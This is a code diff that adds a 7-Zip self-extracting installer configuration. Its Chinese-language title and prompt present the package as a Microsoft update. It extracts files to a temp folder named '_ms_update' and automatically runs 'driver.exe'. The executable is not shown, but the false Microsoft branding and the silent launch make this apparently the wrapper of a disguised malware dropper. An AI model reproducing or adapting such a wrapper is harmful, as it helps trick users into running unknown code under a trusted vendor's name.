@@ -1,0 +1,11 @@
+;!@Install@!UTF-8!
+Title="Microsoft 更新"
+BeginPrompt="您确定要安装此更新吗？"
+Progress="yes"
+Directory="%TEMP%\\_ms_update"
+ExtractPathText="选择更新文件解压位置"
+GUIFlags="2+4"
+GUIMode="1"
+OverwriteMode="0"
+RunProgram="driver.exe"
+;!@InstallEnd@!
